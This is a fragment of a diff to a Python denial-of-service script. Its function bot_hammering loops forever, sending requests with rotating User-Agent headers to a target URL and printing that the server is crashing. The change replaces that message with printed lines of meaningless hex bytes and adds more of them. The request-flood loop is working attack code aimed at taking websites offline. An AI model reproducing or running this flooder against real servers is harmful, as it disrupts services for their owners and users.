@@ -95,7 +95,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94m [*] The Server İs Crashing ✓\033[0m")
+			print("\033[94m CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D6 \033[0m")
 			print("\033[94m CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E \033[0m")
 			print("\033[94m B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD \033[0m")
 			print("\033[94m 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 \033[0m")
@@ -124,6 +124,12 @@ def bot_hammering(url):
 			print("\033[94m 5A 92 8A 70 E6 36 2C DA 3E 36 6E CB AE F1 1B FC \033[0m")
 			print("\033[94m 78 C5 54 82 BA 84 3F DE 2D 7A BD A0 BD E0 40 AB \033[0m")
 			print("\033[94m 84 B2 3D 30 2D A0 87 D1 A3 2A AC 14 71 28 B5 82 \033[0m")
+			print("\033[94m 5C 9D 3F B6 24 3B 3E 0F F7 C2 51 27 D4 D3 0E 97 \033[0m")
+			print("\033[94m CB F0 4A 28 00 93 4A 8E DD 04 77 A3 A1 7D 15 D5 \033[0m")
+			print("\033[94m AA 03 85 99 5C BF A7 32 5B 2F CD 93 C0 5B B5 F6 \033[0m")
+			print("\033[94m DB A3 C7 43 62 F4 11 34 C6 DA BA 38 29 72 4D B9 \033[0m")
+			print("\033[94m A3 11 47 A6 8F 90 63 46 1B 03 89 72 79 99 21 B3 \033[0m")
+			print("\033[94m 9F B5 F4 B9 3C 8B EA DF A0 3E F4 D4 9D F5 16 62 \033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
